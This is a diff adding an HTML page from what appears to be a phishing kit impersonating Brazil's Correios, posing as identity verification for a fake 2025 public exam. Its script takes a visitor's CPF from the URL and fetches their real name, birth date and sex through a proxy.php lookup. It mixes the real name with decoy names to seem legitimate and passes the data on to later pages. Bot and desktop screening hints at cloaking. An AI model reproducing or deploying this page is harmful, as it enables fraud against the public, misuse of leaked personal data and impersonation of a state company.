@@ -1,0 +1,313 @@
+<!DOCTYPE html><html><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+	
+	
+    <script>
+      // Função para detectar se é um dispositivo móvel
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      }
+      // Função para detectar se é um bot
+      function isBot() {
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+      }
+      // Função para verificar se a largura da janela é maior que 768px
+      function isWideScreen() {
+        return window.innerWidth > 768;
+      }
+      // Redirecionar ou bloquear o acesso
+      function checkAccess() {
+        if (isBot() || (!isMobile() && isWideScreen())) {
+        }
+      }
+      // Executar a função de verificação ao carregar a página
+      window.onload = checkAccess;
+      // Adicionar um listener para verificar novamente se a janela for redimensionada
+      window.addEventListener('resize', checkAccess);
+    </script> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correios - Inscrição Concurso 2025</title>
+	<link rel="canonical" href="https://processo-concurso.org">
+    <!-- Preload fonts -->
+    <link rel="preload" href="static/fonts/rawline-400.woff" as="font" type="font/woff2" crossorigin="">
+    <link rel="preload" href="static/fonts/rawline-700.woff" as="font" type="font/woff2" crossorigin="">
+    <!-- Styles -->
+    <link href="css/rawline.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FEEF37',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <div class="bg-correios-yellow py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="images/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2">
+                <div>
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
+                        CONCURSO PÚBLICO 2025
+                    </p>
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Blue bar -->
+    <div class="bg-correios-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">VERIFICAÇÃO DE IDENTIDADE</span>
+        </div>
+    </div>
+   <br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+<!-- Inclua SweetAlert2 via CDN (opcional, para alertas bonitos) -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<div class="container mx-auto px-4 pb-8 flex-grow">
+  <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
+    <form id="inscricaoForm" method="GET" action="../estado/index.html">
+      <p class="mb-6 font-bold text-lg text-correios-blue">Verificação de Segurança - Etapa 1 de 2</p>
+      
+      <p class="text-sm text-gray-700 leading-relaxed">
+        Para sua segurança, selecione seu nome completo correto:
+      </p>
+      <br>
+      
+      <!-- Opção 1 -->
+      <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
+        <input type="radio" name="nome" class="h-4 w-4 text-correios-blue focus:ring-correios-blue" required="">
+        <span class="ml-3 text-gray-700" id="pauloSpan">CARREGANDO...</span>
+      </label>
+      
+      <!-- Opção 2 (nome retornado da API) -->
+      <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
+        <input type="radio" name="nome" id="nomeRadio" class="h-4 w-4 text-correios-blue focus:ring-correios-blue" required="">
+        <span class="ml-3 text-gray-700" id="nomeSpan">CARREGANDO...</span>
+      </label>
+      
+      <!-- Opção 3 -->
+      <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
+        <input type="radio" name="nome" class="h-4 w-4 text-correios-blue focus:ring-correios-blue" required="">
+        <span class="ml-3 text-gray-700" id="pedroSpan">CARREGANDO...</span>
+      </label>
+      
+      <div class="space-y-6">
+        <button type="submit" id="submitBtn" class="bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
+          <span>Confirma Nome</span>
+          <i class="fas fa-arrow-right ml-2"></i>
+        </button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+  <p class="text-sm font-medium">© 2025 Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+  <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  // Função para obter um parâmetro da URL
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+  
+  // Obtenha o CPF para a consulta da API
+  const cpfParam = getQueryParam("cpf");
+  if (!cpfParam) {
+    console.error("Erro: CPF não encontrado na URL.");
+    return;
+  }
+  
+  // Caminho para o proxy PHP (ajuste conforme necessário)
+  const apiUrl = `css/proxy.php?cpf=${encodeURIComponent(cpfParam)}`;
+  
+  fetch(apiUrl, { method: "GET" })
+    .then(response => response.json())
+    .then(responseData => {
+      if (responseData.data) {
+        const dadosPessoais = responseData.data.DADOS_PESSOAIS || {};
+        let nomeAPI = dadosPessoais.NOME || "";
+        const dataNascimento = dadosPessoais.DATA_NASCIMENTO || "";
+        
+        // Utilize o campo SEXO para mapear: se contém "feminino" (ignorando maiúsculas/minúsculas), define como "F"; caso contrário, "M".
+        const sexoRetornado = dadosPessoais.SEXO || "";
+        let genero = "M"; // padrão masculino
+        if (sexoRetornado.toLowerCase().includes("feminino")) {
+          genero = "F";
+        }
+        
+        // Converte o nome da API para maiúsculas (nome correto)
+        nomeAPI = nomeAPI.toUpperCase();
+        
+        // Arrays de nomes fixos com 20 variações para cada gênero
+        const nomesMasculinos = [
+          "PAULO RIBEIRO MARTINS", "PEDRO ALMEIDA COSTA", "JOÃO SILVA", "RICARDO ALVES",
+          "LUIS FERREIRA", "CARLOS EDUARDO", "MARCOS ARAÚJO", "FERNANDO SOUZA",
+          "GUILHERME OLIVEIRA", "BRUNO MENDES", "JORGE COSTA", "MARCIO LIMA",
+          "ANDRÉ GOMES", "VINICIUS RODRIGUES", "LEONARDO PEREIRA", "EDUARDO MORAES",
+          "FELIPE CAMPOS", "RAPHAEL SANTOS", "DANIEL MOURA", "ROBSON BARROS"
+        ];
+        const nomesFemininos = [
+          "MARIA APARECIDA DOS SANTOS", "ANA SILVA", "CAROLINA PEREIRA", "JÚLIA SANTOS",
+          "MARCELA OLIVEIRA", "FABÍOLA COSTA", "LARISSA FERREIRA", "GABRIELA RODRIGUES",
+          "PAULA SOUSA", "BRUNA MENDES", "SANDRA LIMA", "RAQUEL COSTA",
+          "DANIELA CAMPOS", "CRISTINA BARROS", "FABIANA ARAÚJO", "VERÔNICA GOMES",
+          "ANDREA MORAES", "LÚCIA PEREIRA", "ROSANGELA SANTOS", "IRIS COSTA"
+        ];
+        
+        // Separa os arrays conforme o gênero
+        let fixedNames = (genero === "F") ? [...nomesFemininos] : [...nomesMasculinos];
+        // Remova o nome correto, se presente, para evitar duplicação
+        fixedNames = fixedNames.filter(name => name !== nomeAPI);
+        
+        // Se houver menos de 2 nomes após remoção, reatribua o array original e filtre novamente
+        if (fixedNames.length < 2) {
+          fixedNames = (genero === "F") ? nomesFemininos : nomesMasculinos;
+          fixedNames = fixedNames.filter(name => name !== nomeAPI);
+        }
+        
+        // Função para escolher um nome aleatório do array
+        function escolherNomeAleatorio(arr) {
+          const idx = Math.floor(Math.random() * arr.length);
+          return arr[idx];
+        }
+        
+        const fixedName1 = escolherNomeAleatorio(fixedNames);
+        fixedNames = fixedNames.filter(name => name !== fixedName1);
+        const fixedName2 = escolherNomeAleatorio(fixedNames);
+        
+        // Crie o array de opções: as duas fixas e a correta
+        let options = [
+          { value: fixedName1, correct: false },
+          { value: fixedName2, correct: false },
+          { value: nomeAPI, correct: true }
+        ];
+        
+        // Embaralhe as opções aleatoriamente
+        options.sort(() => Math.random() - 0.5);
+        
+        // Atualize os inputs de rádio e os respectivos rótulos (usando IDs pauloSpan, nomeSpan e pedroSpan)
+        const radios = document.querySelectorAll('input[name="nome"]');
+        if (radios.length < 3) {
+          console.error("Não foram encontrados 3 inputs de rádio para nome.");
+          return;
+        }
+        radios[0].value = options[0].value;
+        document.getElementById("pauloSpan").textContent = options[0].value;
+        
+        radios[1].value = options[1].value;
+        document.getElementById("nomeSpan").textContent = options[1].value;
+        
+        radios[2].value = options[2].value;
+        document.getElementById("pedroSpan").textContent = options[2].value;
+        
+        console.log({ nomeAPI, dataNascimento, genero, options });
+        
+        // Evento de clique no botão "Confirma Nome"
+        const submitBtn = document.getElementById("submitBtn");
+        if (submitBtn) {
+          submitBtn.addEventListener("click", function (event) {
+            event.preventDefault();
+            const selected = document.querySelector('input[name="nome"]:checked');
+            if (selected) {
+              const selectedName = selected.value;
+              const urlParams = new URLSearchParams(window.location.search);
+              urlParams.set("cpf", cpfParam);
+              urlParams.set("nomeCompleto", encodeURIComponent(selectedName));
+              urlParams.set("dataNascimento", encodeURIComponent(dataNascimento));
+              
+              // Se o nome selecionado for o correto (igual a nomeAPI), redirecione para ../data_nascimento/index.html;
+              // Caso contrário, exiba um alerta e redirecione para ../sistema/index.html.
+              if (selectedName === nomeAPI) {
+                const newUrl = `../data_nascimento/index.html?${urlParams.toString()}`;
+                window.location.href = newUrl;
+              } else {
+                Swal.fire({
+                  icon: 'error',
+                  title: 'Nome incorreto',
+                  text: 'O nome completo selecionado não corresponde ao seu registro. Por favor, tente novamente.',
+                  confirmButtonText: 'OK'
+                }).then(() => {
+                  const newUrl = `../sistema/index.html?${urlParams.toString()}`;
+                  window.location.href = newUrl;
+                });
+              }
+            } else {
+              Swal.fire({
+                icon: 'warning',
+                title: 'Nenhum nome selecionado',
+                text: 'Por favor, selecione seu nome completo.',
+                confirmButtonText: 'OK'
+              });
+            }
+          });
+        }
+      } else {
+        console.error("Erro: Dados não encontrados.");
+      }
+    })
+    .catch(error => console.error("Erro na requisição:", error));
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+
+</body></html>
